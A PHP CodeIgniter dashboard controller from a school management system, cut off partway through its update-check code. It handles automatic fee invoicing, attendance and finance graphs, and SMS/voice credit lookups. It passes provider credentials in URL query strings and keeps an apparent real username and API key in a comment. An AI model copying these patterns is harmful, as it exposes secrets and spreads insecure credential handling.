<?php

if ( !defined('BASEPATH') ) {
    exit('No direct script access allowed');
}

    class Dashboard extends Admin_Controller
    {
        /*
        | -----------------------------------------------------
        | PRODUCT NAME: 	INILABS SCHOOL MANAGEMENT SYSTEM
        | -----------------------------------------------------
        | AUTHOR:			INILABS TEAM
        | -----------------------------------------------------
        | EMAIL:			info@inilabs.net
        | -----------------------------------------------------
        | COPYRIGHT:		RESERVED BY INILABS IT
        | -----------------------------------------------------
        | WEBSITE:			http://inilabs.net
        | -----------------------------------------------------
        */
        protected $_versionCheckingUrl = 'http://demo.inilabs.net/autoupdate/update/index';

        function __construct()
        {
            parent::__construct();
            $this->load->model('systemadmin_m');
            $this->load->model("dashboard_m");
            $this->load->model("automation_shudulu_m");
            $this->load->model("automation_rec_m");
            $this->load->model("setting_m");
            $this->load->model("notice_m");
            $this->load->model("user_m");
            $this->load->model("student_m");
            $this->load->model("classes_m");
            $this->load->model("teacher_m");
            $this->load->model("parents_m");
            $this->load->model("sattendance_m");
            $this->load->model("subjectattendance_m");
            $this->load->model("subject_m");
            $this->load->model("feetypes_m");
            $this->load->model("invoice_m");
            $this->load->model("expense_m");
            $this->load->model("payment_m");
            $this->load->model("lmember_m");
            $this->load->model("book_m");
            $this->load->model("issue_m");
            $this->load->model('hmember_m');
            $this->load->model('tmember_m');
            $this->load->model('event_m');
            $this->load->model('holiday_m');
            $this->load->model('visitorinfo_m');
            $this->load->model('income_m');
            $this->load->model('make_payment_m');
            $this->load->model('maininvoice_m');
            $this->load->model('studentrelation_m');
            $language = $this->session->userdata('lang');
            $this->lang->load('dashboard', $language);

            $this->_automation();
        }

        private function _automation()
        {
            /* Automation Start */
            if ( $this->data['siteinfos']->auto_invoice_generate == 1 ) {

                $array        = [];
                $autoRecArray = [];
                $cnt          = 0;
                $date         = date('Y-m-d');
                $day          = date('d');
                $month        = date('m');
                $year         = date('Y');
                $setting      = $this->setting_m->get_setting();
                if ( $day >= $setting->automation ) {
                    $libraryFeetype = $this->feetypes_m->get_single_feetypes([ 'feetypes' => $this->lang->line('dashboard_libraryfee') ]);
                    if ( !customCompute($libraryFeetype) ) {
                        $this->feetypes_m->insert_feetypes([
                            'feetypes' => $this->lang->line('dashboard_libraryfee'),
                            'note'     => "Don't delete it!"
                        ]);
                    }
                    $libraryFeetype = $this->feetypes_m->get_single_feetypes([ 'feetypes' => $this->lang->line('dashboard_libraryfee') ]);

                    $transportFeetype = $this->feetypes_m->get_single_feetypes([ 'feetypes' => $this->lang->line('dashboard_transportfee') ]);
                    if ( !customCompute($transportFeetype) ) {
                        $this->feetypes_m->insert_feetypes([
                            'feetypes' => $this->lang->line('dashboard_transportfee'),
                            'note'     => "Don't delete it!"
                        ]);
                    }
                    $transportFeetype = $this->feetypes_m->get_single_feetypes([ 'feetypes' => $this->lang->line('dashboard_transportfee') ]);

                    $hostelFeetype = $this->feetypes_m->get_single_feetypes([ 'feetypes' => $this->lang->line('dashboard_hostelfee') ]);
                    if ( !customCompute($hostelFeetype) ) {
                        $this->feetypes_m->insert_feetypes([
                            'feetypes' => $this->lang->line('dashboard_hostelfee'),
                            'note'     => "Don't delete it!"
                        ]);
                    }
                    $hostelFeetype = $this->feetypes_m->get_single_feetypes([ 'feetypes' => $this->lang->line('dashboard_hostelfee') ]);

                    $automation_shudulus = $this->automation_shudulu_m->get_automation_shudulu();

                    if ( customCompute($automation_shudulus) ) {
                        foreach ( $automation_shudulus as $automation_shudulu ) {
                            if ( $automation_shudulu->month == $month && $automation_shudulu->year == $year ) {
                                $cnt = 1;
                            }
                        }

                        if ( $cnt === 0 ) {
                            $automationStudents = $this->student_m->general_get_order_by_student([
                                'schoolyearID' => $this->data['siteinfos']->school_year,
                                'classesID !=' => $this->data['siteinfos']->ex_class
                            ]);
                            $automationLMember  = pluck($this->lmember_m->get_lmember(), 'lbalance', 'studentID');
                            $automationTMember  = pluck($this->tmember_m->get_tmember(), 'tbalance', 'studentID');
                            $automationHMember  = pluck($this->hmember_m->get_hmember(), 'hbalance', 'studentID');
                            $allRecord          = $this->_getAllRec($this->automation_rec_m->get_automation_rec());
                            $superAdmin         = $this->systemadmin_m->get_systemadmin(1);

                            $mainInvoiceArray = [];
                            if ( customCompute($automationStudents) ) {
                                foreach ( $automationStudents as $aTstudentkey => $aTstudent ) {
                                    if ( customCompute($automationLMember) ) {
                                        if ( isset($automationLMember[ $aTstudent->studentID ]) ) {
                                            if ( $automationLMember[ $aTstudent->studentID ] > 0 ) {
                                                if ( !isset($allRecord[5427279][ $aTstudent->studentID ][ $month ][ $year ]) ) {

                                                    $mainInvoiceArray[] = [
                                                        'maininvoiceschoolyearID' => $this->data['siteinfos']->school_year,
                                                        'maininvoiceclassesID'    => $aTstudent->classesID,
                                                        'maininvoicestudentID'    => $aTstudent->studentID,
                                                        'maininvoicestatus'       => 0,
                                                        'maininvoiceuserID'       => 1,
                                                        'maininvoiceusertypeID'   => 1,
                                                        'maininvoiceuname'        => null,
                                                        'maininvoicedate'         => date("Y-m-d"),
                                                        'maininvoicecreate_date'  => date('Y-m-d'),
                                                        'maininvoiceday'          => date('d'),
                                                        'maininvoicemonth'        => date('m'),
                                                        'maininvoiceyear'         => date('Y'),
                                                        'maininvoicedeleted_at'   => 1
                                                    ];

                                                    $array[] = [
                                                        'schoolyearID' => $this->data['siteinfos']->school_year,
                                                        'classesID'    => $aTstudent->classesID,
                                                        'studentID'    => $aTstudent->studentID,
                                                        'feetypeID'    => customCompute($libraryFeetype) ? $libraryFeetype->feetypesID : 0,
                                                        'feetype'      => customCompute($libraryFeetype) ? $libraryFeetype->feetypes : null,
                                                        'amount'       => (int) $automationLMember[ $aTstudent->studentID ],
                                                        'discount'     => 0,
                                                        'paidstatus'   => 0,
                                                        'userID'       => 1,
                                                        'usertypeID'   => 1,
                                                        'uname'        => $superAdmin->name,
                                                        'date'         => date("Y-m-d"),
                                                        'create_date'  => date('Y-m-d'),
                                                        'day'          => date('d'),
                                                        'month'        => date('m'),
                                                        'year'         => date('Y'),
                                                        'deleted_at'   => 1
                                                    ];

                                                    $autoRecArray[] = [
                                                        'studentID' => $aTstudent->studentID,
                                                        'date'      => $date,
                                                        'day'       => $day,
                                                        'month'     => $month,
                                                        'year'      => $year,
                                                        'nofmodule' => 5427279
                                                    ];
                                                }
                                            }
                                        }
                                    }

                                    if ( customCompute($automationTMember) ) {
                                        if ( isset($automationTMember[ $aTstudent->studentID ]) ) {
                                            if ( $automationTMember[ $aTstudent->studentID ] > 0 ) {
                                                if ( !isset($allRecord[872677678][ $aTstudent->studentID ][ $month ][ $year ]) ) {

                                                    $mainInvoiceArray[] = [
                                                        'maininvoiceschoolyearID' => $this->data['siteinfos']->school_year,
                                                        'maininvoiceclassesID'    => $aTstudent->classesID,
                                                        'maininvoicestudentID'    => $aTstudent->studentID,
                                                        'maininvoicestatus'       => 0,
                                                        'maininvoiceuserID'       => 1,
                                                        'maininvoiceusertypeID'   => 1,
                                                        'maininvoiceuname'        => null,
                                                        'maininvoicedate'         => date("Y-m-d"),
                                                        'maininvoicecreate_date'  => date('Y-m-d'),
                                                        'maininvoiceday'          => date('d'),
                                                        'maininvoicemonth'        => date('m'),
                                                        'maininvoiceyear'         => date('Y'),
                                                        'maininvoicedeleted_at'   => 1
                                                    ];

                                                    $array[] = [
                                                        'schoolyearID' => $this->data['siteinfos']->school_year,
                                                        'classesID'    => $aTstudent->classesID,
                                                        'studentID'    => $aTstudent->studentID,
                                                        'feetypeID'    => customCompute($transportFeetype) ? $transportFeetype->feetypesID : 0,
                                                        'feetype'      => customCompute($transportFeetype) ? $transportFeetype->feetypes : 0,
                                                        'amount'       => (int) $automationTMember[ $aTstudent->studentID ],
                                                        'discount'     => 0,
                                                        'paidstatus'   => 0,
                                                        'userID'       => 1,
                                                        'usertypeID'   => 1,
                                                        'uname'        => $superAdmin->name,
                                                        'date'         => date("Y-m-d"),
                                                        'create_date'  => date('Y-m-d'),
                                                        'day'          => date('d'),
                                                        'month'        => date('m'),
                                                        'year'         => date('Y'),
                                                        'deleted_at'   => 1
                                                    ];

                                                    $autoRecArray[] = [
                                                        'studentID' => $aTstudent->studentID,
                                                        'date'      => $date,
                                                        'day'       => $day,
                                                        'month'     => $month,
                                                        'year'      => $year,
                                                        'nofmodule' => 872677678
                                                    ];
                                                }
                                            }
                                        }
                                    }

                                    if ( customCompute($automationHMember) ) {
                                        if ( isset($automationHMember[ $aTstudent->studentID ]) ) {
                                            if ( $automationHMember[ $aTstudent->studentID ] > 0 ) {
                                                if ( !isset($allRecord[467835][ $aTstudent->studentID ][ $month ][ $year ]) ) {

                                                    $mainInvoiceArray[] = [
                                                        'maininvoiceschoolyearID' => $this->data['siteinfos']->school_year,
                                                        'maininvoiceclassesID'    => $aTstudent->classesID,
                                                        'maininvoicestudentID'    => $aTstudent->studentID,
                                                        'maininvoicestatus'       => 0,
                                                        'maininvoiceuserID'       => 1,
                                                        'maininvoiceusertypeID'   => 1,
                                                        'maininvoiceuname'        => null,
                                                        'maininvoicedate'         => date("Y-m-d"),
                                                        'maininvoicecreate_date'  => date('Y-m-d'),
                                                        'maininvoiceday'          => date('d'),
                                                        'maininvoicemonth'        => date('m'),
                                                        'maininvoiceyear'         => date('Y'),
                                                        'maininvoicedeleted_at'   => 1
                                                    ];

                                                    $array[] = [
                                                        'schoolyearID' => $this->data['siteinfos']->school_year,
                                                        'classesID'    => $aTstudent->classesID,
                                                        'studentID'    => $aTstudent->studentID,
                                                        'feetypeID'    => customCompute($hostelFeetype) ? $hostelFeetype->feetypesID : null,
                                                        'feetype'      => customCompute($hostelFeetype) ? $hostelFeetype->feetypes : null,
                                                        'feetype'      => $this->lang->line('dashboard_hostelfee'),
                                                        'amount'       => (int) $automationHMember[ $aTstudent->studentID ],
                                                        'discount'     => 0,
                                                        'paidstatus'   => 0,
                                                        'userID'       => 1,
                                                        'usertypeID'   => 1,
                                                        'uname'        => $superAdmin->name,
                                                        'date'         => date("Y-m-d"),
                                                        'create_date'  => date('Y-m-d'),
                                                        'day'          => date('d'),
                                                        'month'        => date('m'),
                                                        'year'         => date('Y'),
                                                        'deleted_at'   => 1
                                                    ];

                                                    $autoRecArray[] = [
                                                        'studentID' => $aTstudent->studentID,
                                                        'date'      => $date,
                                                        'day'       => $day,
                                                        'month'     => $month,
                                                        'year'      => $year,
                                                        'nofmodule' => 467835
                                                    ];
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                            if ( customCompute($mainInvoiceArray) ) {
                                $count   = customCompute($mainInvoiceArray);
                                $firstID = $this->maininvoice_m->insert_batch_maininvoice($mainInvoiceArray);
                                $lastID  = $firstID + ( $count - 1 );

                                if ( $lastID >= $firstID ) {
                                    $j = 0;
                                    for ( $i = $firstID; $i <= $lastID; $i++ ) {
                                        $array[ $j ]['maininvoiceID'] = $i;
                                        $j++;
                                    }
                                }

                                if ( customCompute($array) ) {
                                    $this->invoice_m->insert_batch_invoice($array);
                                }

                                if ( customCompute($autoRecArray) ) {
                                    $this->automation_rec_m->insert_batch_automation_rec($autoRecArray);
                                }

                                $this->automation_shudulu_m->insert_automation_shudulu([
                                    'date'  => $date,
                                    'day'   => $day,
                                    'month' => $month,
                                    'year'  => $year
                                ]);
                            }
                        }
                    } else {
                        $this->automation_shudulu_m->insert_automation_shudulu([
                            'date'  => $date,
                            'day'   => $day,
                            'month' => $month,
                            'year'  => $year
                        ]);
                    }
                }
            }
            /* Automation Close */
        }

        private function _getAllRec( $arrays )
        {
            $returnArray = [];
            if ( customCompute($arrays) ) {
                foreach ( $arrays as $key => $array ) {
                    $returnArray[ $array->nofmodule ][ $array->studentID ][ $array->month ][ $array->year ] = 'Yes';
                }
            }
            return $returnArray;
        }

        public function index()
        {
           // echo 'hi';die;
            $this->data['headerassets'] = [
                'css' => [
                    'assets/fullcalendar/lib/cupertino/jquery-ui.min.css',
                    'assets/fullcalendar/fullcalendar.css',
                ],
                'js'  => [
                    'assets/highcharts/highcharts.js',
                    'assets/highcharts/highcharts-more.js',
                    'assets/highcharts/data.js',
                    'assets/highcharts/drilldown.js',
                    'assets/highcharts/exporting.js',
                    'assets/fullcalendar/lib/jquery-ui.min.js',
                    'assets/fullcalendar/lib/moment.min.js',
                    'assets/fullcalendar/fullcalendar.min.js',
                ]
            ];

            $this->_tails();
            $this->_attendanceGraph();
            $this->_incomeExpenseGraph();
            $this->_visitorGraph();
            $this->_profile();

            if ( ( config_item('demo') === false ) && ( $this->data['siteinfos']->auto_update_notification == 1 ) && ( $this->session->userdata('usertypeID') == 1 ) && ( $this->session->userdata('loginuserID') == 1 ) ) {
                if ( $this->session->userdata('updatestatus') === null ) {
                    $this->data['versionChecking'] = $this->_checkUpdate();
                } else {
                    $this->data['versionChecking'] = 'none';
                }
            } else {
                $this->data['versionChecking'] = 'none';
            }
            $this->data['sms_count'] = $this->get_sms_credits();
            $this->data['voice_count'] = $this->get_voice_credits('voice');
            $this->data['whatsapp_count'] = $this->get_voice_credits('whatsapp');
            // $this->data['whatsapp_count'] = $this->get_whatsapp_credits();

            $this->db->where('fieldoption',"is_fee_sms");
            $is_fee_sms = $this->db->get('setting')->num_rows();
            if($is_fee_sms == 0){
                $this->db->insert('setting',array('fieldoption'=>'is_fee_sms','value'=>1));
            }
            
            $this->data["subview"] = "dashboard/index";
            $this->load->view('_layout_main', $this->data);
        }
        
        private function get_sms_credits()
        {
            $this->load->model('smssettings_m');
            $msg91_bind = [];
            $get_msg91s = $this->smssettings_m->get_order_by_msg91();
            foreach ( $get_msg91s as $key => $get_msg91 ) {
                $msg91_bind[ $get_msg91->field_names ] = $get_msg91->field_values;
            }
            $username = $msg91_bind['msg91_username'];
            $password = $msg91_bind['msg91_password'];
            if($username!='' && $password!='')
            {
                // $result = file_get_contents("http://182.18.170.201/api.php?username=".$username."&password=".$password);
                // echo "https://smslogin.co/v3/api.php?username=".$username."&apikey=".$password;die; 
                $result = file_get_contents("https://smslogin.co/v3/api.php?username=".$username."&apikey=".$password);
                $res = json_decode($result);
                $cnt = (json_decode($res)); 
                
                // https://smslogin.co/v3/api.php?username=Demoschool123&apikey=7687263fe67c116e34b6

                return round($cnt->Credits);
            }
            else
            {
                return 0;
            }
        }
        
        private function get_voice_credits($type="")
        {
            $this->load->model('smssettings_m');
            $get_msg91s = $this->smssettings_m->get_order_by_bulk();
            if(isset($get_msg91s[0]->field_names) && isset($get_msg91s[0]->field_values))
            {
                $bearer = $get_msg91s[0]->field_values;
                $result = file_get_contents("https://voice.vignosoft.com/api_v2/user/balance?api_key=".$bearer);
                $response = json_decode($result);
                if(isset($response->success) && $response->success==true)
                {
                    if($type == 'whatsapp'){
                        return @$response->data->wa_credit;
                    }else{
                        return @$response->data->voice_credit;
                    }
                    
                }
            }
            return 100;
        }

        private function get_whatsapp_credits()
        {
            $this->load->model('smssettings_m');
            $get_msg91s = $this->smssettings_m->get_order_by_whatsapp();
            if(isset($get_msg91s[0]->field_names) && isset($get_msg91s[0]->field_values))
            {
                $bearer = $get_msg91s[0]->field_values;
               // $result = file_get_contents("https://voice.vignosoft.com/api_v2/user/balance?api_key=".$bearer);
               $url = "https://voice.vignosoft.com/api_v2/user/balance?api_key=".$bearer;
               $result = $this->url_get_contents($url);
                $response = json_decode($result);
                // print_r($result);die;
                if(isset($response->success) && $response->success==true)
                {
                    return @$response->data->wa_credit;
                }
            }
            return 100;
        }

        function url_get_contents ($url) {
            // echo $url;
                        
            $ch = curl_init(); 
            curl_setopt($ch, CURLOPT_URL, $url);

            // 3. set cURL to return as a string
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            // 4. execute cURL and store the result
            $output = curl_exec($ch);

            if (curl_errno($ch)) {
               echo $error_msg = curl_error($ch);die;
            }

            // 5. close cURL after use
            curl_close($ch);
 
            print_r($output) ;die;
        }

        private function _tails()
        {
            $schoolyearID = $this->session->userdata('defaultschoolyearID');
            $loginuserID  = $this->session->userdata('loginuserID');

            $students    = $this->studentrelation_m->get_order_by_student([ 'srschoolyearID' => $schoolyearID ]);
            $classes     = pluck($this->classes_m->get_classes(), 'obj', 'classesID');
            $teachers    = $this->teacher_m->get_teacher();
            $parents     = $this->parents_m->get_parents();
            $books       = $this->book_m->get_book();
            $feetypes    = $this->feetypes_m->get_feetypes();
            $lmembers    = $this->lmember_m->get_lmember();
            $events      = $this->event_m->get_order_by_event([ 'schoolyearID' => $schoolyearID ]);
            $holidays    = $this->holiday_m->get_order_by_holiday([ 'schoolyearID' => $schoolyearID ]);
            $visitors    = $this->visitorinfo_m->get_order_by_visitorinfo([ 'schoolyearID' => $schoolyearID ]);
            $allmenu     = pluck($this->menu_m->get_order_by_menu(), 'icon', 'link');
            $allmenulang = pluck($this->menu_m->get_order_by_menu(), 'menuName', 'link');
            $users       = $this->user_m->get_all_user('user');
            if ( $this->session->userdata('usertypeID') == 3 ) {
                $getLoginStudent = $this->studentrelation_m->get_single_student([
                    'srstudentID'    => $loginuserID,
                    'srschoolyearID' => $schoolyearID
                ]);
                if ( customCompute($getLoginStudent) ) {
                    $subjects = $this->subject_m->get_order_by_subject([ 'classesID' => $getLoginStudent->srclassesID ]);
                    $invoices = $this->maininvoice_m->get_order_by_maininvoice([
                        'maininvoicestudentID'    => $getLoginStudent->srstudentID,
                        'maininvoiceschoolyearID' => $schoolyearID,
                        'maininvoicedeleted_at'   => 1
                    ]);
                    $lmember  = $this->lmember_m->get_single_lmember([ 'studentID' => $getLoginStudent->srstudentID ]);
                    if ( customCompute($lmember) ) {
                        $issues = $this->issue_m->get_order_by_issue([ "lID" => $lmember->lID, 'return_date' => null ]);
                    } else {
                        $issues = [];
                    }
                } else {
                    $invoices = [];
                    $subjects = [];
                    $issues   = [];
                }
            } else {
                $invoices = $this->maininvoice_m->get_order_by_maininvoice([
                    'maininvoiceschoolyearID' => $schoolyearID,
                    'maininvoicedeleted_at'   => 1
                ]);
                $subjects = $this->subject_m->get_subject();
                $issues   = $this->issue_m->get_order_by_issue([ 'return_date' => null ]);
            }

            $this->data['dashboardWidget']['users']    = customCompute($users);
            $this->data['dashboardWidget']['students']    = customCompute($students);
            $this->data['dashboardWidget']['classes']     = customCompute($classes);
            $this->data['dashboardWidget']['teachers']    = customCompute($teachers);
            $this->data['dashboardWidget']['parents']     = customCompute($parents);
            // $this->data['dashboardWidget']['subjects']    = customCompute($subjects);
            $this->data['dashboardWidget']['books']       = customCompute($books);
            $this->data['dashboardWidget']['feetypes']    = customCompute($feetypes);
            $this->data['dashboardWidget']['lmembers']    = customCompute($lmembers);
            $this->data['dashboardWidget']['events']      = customCompute($events);
            $this->data['dashboardWidget']['issues']      = customCompute($issues);
            $this->data['dashboardWidget']['holidays']    = customCompute($holidays);
            $this->data['dashboardWidget']['invoices']    = customCompute($invoices);
            $this->data['dashboardWidget']['visitors']    = customCompute($visitors);
            $this->data['dashboardWidget']['allmenu']     = $allmenu;
            $this->data['dashboardWidget']['allmenulang'] = $allmenulang;

            $this->data['notices']  = $this->notice_m->get_order_by_notice([ 'schoolyearID' => $schoolyearID ]);
            $this->data['holidays'] = $holidays;
            $this->data['events']   = $events;
            $this->data['classes']  = $classes;
        }

        private function _attendanceGraph()
        {
            $schoolyearID                   = $this->session->userdata('defaultschoolyearID');
            $attendanceSystem               = $this->data['siteinfos']->attendance;
            $this->data['attendanceSystem'] = $attendanceSystem;

            if ( $attendanceSystem != 'subject' ) {
                $attendances = $this->sattendance_m->get_order_by_attendance([
                    'schoolyearID' => $schoolyearID,
                    'monthyear'    => date('m-Y')
                ]);

                $classWiseAttendance = [];
                foreach ( $attendances as $attendance ) {
                    for ( $i = 1; $i <= 31; $i++ ) {
                        if ( $i > date('d') ) {
                            break;
                        }
                        $date = 'a' . $i;

                        if ( !isset($classWiseAttendance[ $attendance->classesID ][ $i ]['P']) ) {
                            $classWiseAttendance[ $attendance->classesID ][ $i ]['P'] = 0;
                        }

                        if ( !isset($classWiseAttendance[ $attendance->classesID ][ $i ]['A']) ) {
                            $classWiseAttendance[ $attendance->classesID ][ $i ]['A'] = 0;
                        }

                        if ( $attendance->$date == 'P' || $attendance->$date == 'L' || $attendance->$date == 'LE' ) {
                            $classWiseAttendance[ $attendance->classesID ][ $i ]['P']++;
                        } else {
                            $classWiseAttendance[ $attendance->classesID ][ $i ]['A']++;
                        }
                    }
                }

                $todaysAttendance = [];
                foreach ( $classWiseAttendance as $key => $value ) {
                    $todaysAttendance[ $key ] = $value[ (int) date('d') ];
                }

                $this->data['classWiseAttendance'] = $classWiseAttendance;
                $this->data['todaysAttendance']    = $todaysAttendance;
            } else {
                $subjectWiseAttendance = [];
                $attendances           = $this->subjectattendance_m->get_order_by_sub_attendance([
                    'schoolyearID' => $schoolyearID,
                    'monthyear'    => date('m-Y')
                ]);

                foreach ( $attendances as $attendance ) {
                    for ( $i = 1; $i <= 31; $i++ ) {
                        if ( $i > date('d') ) {
                            break;
                        }
                        $date = 'a' . $i;

                        if ( !isset($subjectWiseAttendance[ $attendance->classesID ][ $attendance->subjectID ][ $i ]['P']) ) {
                            $subjectWiseAttendance[ $attendance->classesID ][ $attendance->subjectID ][ $i ]['P'] = 0;
                        }

                        if ( !isset($subjectWiseAttendance[ $attendance->classesID ][ $attendance->subjectID ][ $i ]['A']) ) {
                            $subjectWiseAttendance[ $attendance->classesID ][ $attendance->subjectID ][ $i ]['A'] = 0;
                        }

                        if ( $attendance->$date == 'P' || $attendance->$date == 'L' || $attendance->$date == 'LE' ) {
                            $subjectWiseAttendance[ $attendance->classesID ][ $attendance->subjectID ][ $i ]['P']++;
                        } else {
                            $subjectWiseAttendance[ $attendance->classesID ][ $attendance->subjectID ][ $i ]['A']++;
                        }
                    }
                }

                $todaysSubjectWiseAttendance = [];
                foreach ( $subjectWiseAttendance as $class => $subject ) {
                    foreach ( $subject as $key => $value ) {
                        if ( !isset($todaysSubjectWiseAttendance[ $class ]) ) {
                            $todaysSubjectWiseAttendance[ $class ]['P'] = 0;
                            $todaysSubjectWiseAttendance[ $class ]['A'] = 0;
                        }
                        $todaysSubjectWiseAttendance[ $class ]['P'] += $value[ (int) date('d') ]['P'];
                        $todaysSubjectWiseAttendance[ $class ]['A'] += $value[ (int) date('d') ]['A'];
                    }
                }

                $this->data['subjectWiseAttendance']       = $subjectWiseAttendance;
                $this->data['todaysSubjectWiseAttendance'] = $todaysSubjectWiseAttendance;
            }
        }

        private function _incomeExpenseGraph()
        {
            $months = [
                1 => 'January',
                'February',
                'March',
                'April',
                'May',
                'June',
                'July ',
                'August',
                'September',
                'October',
                'November',
                'December',
            ];

            $monthArray   = [];
            $schoolyearID = $this->session->userdata('defaultschoolyearID');
            $schoolyear   = $this->schoolyear_m->get_obj_schoolyear($schoolyearID);
            if ( customCompute($schoolyear) ) {
                $monthStart = abs($schoolyear->startingmonth);
                if ( $schoolyear->startingyear == $schoolyear->endingyear ) {
                    $monthLimit = ( ( $schoolyear->endingmonth - $schoolyear->startingmonth ) + 1 );
                } else {
                    $monthLimit = ( $schoolyear->startingmonth + $schoolyear->endingmonth + 1 );
                }

                $n = $monthStart;
                for ( $k = 1; $k <= $monthLimit; $k++ ) {
                    $monthArray[ $n ] = $months[ $n ];
                    $n++;
                    if ( $n > 12 ) {
                        $n = 1;
                    }
                }
                $months = $monthArray;
            }

            $incomes  = $this->income_m->get_order_by_income([ 'schoolyearID' => $schoolyearID ]);
            $payments = $this->payment_m->get_order_by_payment([
                'schoolyearID'  => $schoolyearID,
                'paymentamount' => null
            ]);

            $expenses     = $this->expense_m->get_order_by_expense([ 'schoolyearID' => $schoolyearID ]);
            $makepayments = $this->make_payment_m->get_order_by_make_payment([ 'schoolyearID' => $schoolyearID ]);


            $incomeMonthAndDay = [];
            $incomeMonthTotal  = [];
            if ( customCompute($incomes) ) {
                foreach ( $incomes as $incomeKey => $income ) {
                    if ( !isset($incomeMonthAndDay[ (int) $income->incomemonth ][ $income->incomeday ]) ) {
                        $incomeMonthAndDay[ (int) $income->incomemonth ][ (string) $income->incomeday ] = 0;
                    }

                    $incomeMonthAndDay[ (int) $income->incomemonth ][ (string) $income->incomeday ] += $income->amount;
                    if ( !isset($incomeMonthTotal[ (int) $income->incomemonth ]) ) {
                        $incomeMonthTotal[ (int) $income->incomemonth ] = 0;
                    }
                    $incomeMonthTotal[ (int) $income->incomemonth ] += $income->amount;
                }
            }

            if ( customCompute($payments) ) {
                foreach ( $payments as $paymentKey => $payment ) {
                    if ( !isset($incomeMonthAndDay[ (int) $payment->paymentmonth ][ $payment->paymentday ]) ) {
                        $incomeMonthAndDay[ (int) $payment->paymentmonth ][ (string) $payment->paymentday ] = 0;
                    }

                    $incomeMonthAndDay[ (int) $payment->paymentmonth ][ (string) $payment->paymentday ] += $payment->paymentamount;
                    if ( !isset($incomeMonthTotal[ (int) $payment->paymentmonth ]) ) {
                        $incomeMonthTotal[ (int) $payment->paymentmonth ] = 0;
                    }
                    $incomeMonthTotal[ (int) $payment->paymentmonth ] += $payment->paymentamount;
                }
            }

            $expenseMonthAndDay = [];
            $expenseMonthTotal  = [];
            if ( customCompute($expenses) ) {
                foreach ( $expenses as $expenseKey => $expense ) {
                    if ( !isset($expenseMonthAndDay[ (int) $expense->expensemonth ][ $expense->expenseday ]) ) {
                        $expenseMonthAndDay[ (int) $expense->expensemonth ][ (string) $expense->expenseday ] = 0;
                    }

                    $expenseMonthAndDay[ (int) $expense->expensemonth ][ (string) $expense->expenseday ] += $expense->amount;
                    if ( !isset($expenseMonthTotal[ (int) $expense->expensemonth ]) ) {
                        $expenseMonthTotal[ (int) $expense->expensemonth ] = 0;
                    }
                    $expenseMonthTotal[ (int) $expense->expensemonth ] += $expense->amount;
                }
            }

            if ( customCompute($makepayments) ) {
                foreach ( $makepayments as $makepaymentKey => $makepayment ) {
                    $makepaymentDay   = date('d', strtotime($makepayment->create_date));
                    $makepaymentMonth = date('m', strtotime($makepayment->create_date));
                    if ( !isset($expenseMonthAndDay[ (int) $makepaymentMonth ][ $makepaymentDay ]) ) {
                        $expenseMonthAndDay[ (int) $makepaymentMonth ][ (string) $makepaymentDay ] = 0;
                    }

                    $expenseMonthAndDay[ (int) $makepaymentMonth ][ (string) $makepaymentDay ] += $makepayment->payment_amount;
                    if ( !isset($expenseMonthTotal[ (int) $makepaymentMonth ]) ) {
                        $expenseMonthTotal[ (int) $makepaymentMonth ] = 0;
                    }
                    $expenseMonthTotal[ (int) $makepaymentMonth ] += $makepayment->payment_amount;
                }
            }
            
            $paymentsTotal = $this->payment_m->get_order_by_payment([
                'schoolyearID'  => $schoolyearID
            ]);
            $paymentMonthAndDay = [];
            $paymentMonthTotal  = [];
            if ( customCompute($paymentsTotal) ) {
                foreach ( $paymentsTotal as $makepaymentKey => $makepayment ) {
                    $makepaymentDay   = date('d', strtotime($makepayment->paymentdate));
                    $makepaymentMonth = date('m', strtotime($makepayment->paymentdate));
                    if ( !isset($paymentMonthAndDay[ (int) $makepaymentMonth ][ $makepaymentDay ]) ) {
                        $paymentMonthAndDay[ (int) $makepaymentMonth ][ (string) $makepaymentDay ] = 0;
                    }

                    $paymentMonthAndDay[ (int) $makepaymentMonth ][ (string) $makepaymentDay ] += $makepayment->paymentamount;
                    if ( !isset($paymentMonthTotal[ (int) $makepaymentMonth ]) ) {
                        $paymentMonthTotal[ (int) $makepaymentMonth ] = 0;
                    }
                    $paymentMonthTotal[ (int) $makepaymentMonth ] += $makepayment->paymentamount;
                }
            }
            $this->data['months']             = $months;
            $this->data['incomeMonthAndDay']  = $paymentMonthAndDay;//$incomeMonthAndDay;
            $this->data['incomeMonthTotal']   = $paymentMonthTotal;//$incomeMonthTotal;
            $this->data['expenseMonthAndDay'] = $expenseMonthAndDay;
            $this->data['expenseMonthTotal']  = $expenseMonthTotal;
        }

        private function _visitorGraph()
        {
            $showChartVisitor  = [];
            $currentDate       = strtotime(date('Y-m-d H:i:s'));
            $previousSevenDate = strtotime(date('Y-m-d 00:00:00', strtotime('-7 days')));
            $visitors          = $this->loginlog_m->get_order_by_loginlog([
                'login <= ' => $currentDate,
                'login >= ' => $previousSevenDate
            ]);
            foreach ( $visitors as $visitor ) {
                $date = date('j M', $visitor->login);
                if ( !isset($showChartVisitor[ $date ]) ) {
                    $showChartVisitor[ $date ] = 0;
                }
                $showChartVisitor[ $date ]++;
            }
            $this->data['showChartVisitor'] = $showChartVisitor;
        }

        private function _profile()
        {
            $userTypeID             = $this->session->userdata('usertypeID');
            $loginUserID            = $this->session->userdata('loginuserID');
            $this->data['usertype'] = $this->session->userdata('usertype');

            if ( $userTypeID == 1 ) {
                $this->data['user'] = $this->systemadmin_m->get_single_systemadmin([ 'systemadminID' => $loginUserID ]);
            } elseif ( $userTypeID == 2 ) {
                $this->data['user'] = $this->teacher_m->get_single_teacher([ 'teacherID' => $loginUserID ]);
            } elseif ( $userTypeID == 3 ) {
                $this->data['user'] = $this->studentrelation_m->general_get_single_student([ 'studentID' => $loginUserID ]);
            } elseif ( $userTypeID == 4 ) {
                $this->data['user'] = $this->parents_m->get_single_parents([ 'parentsID' => $loginUserID ]);
            } else {
                $this->data['user'] = $this->user_m->get_single_user([ 'userID' => $loginUserID ]);
            }
        }

        private function _checkUpdate()
        {
            $version = 'none';
            if ( $this->session->userdata('usertypeID') == 1 && $this->session->userdata('loginuserID') == 1 ) {
                if ( customCompute($postDatas = @$this->_postData()) ) {
                    $versionChecking = $this->_versionChecking($postDatas);
                    if ( $versionChecking->status ) {
                        $version = $versionChecking->version;
                    }
                }
            }

            return $version;
        }

        private function _postData()
        {
            $postDatas = [];
            $this->load->model('update_m');
            $updates = $this->update_m->get_max_update();
            if ( customCompute($updates) ) {
                $postDatas = [
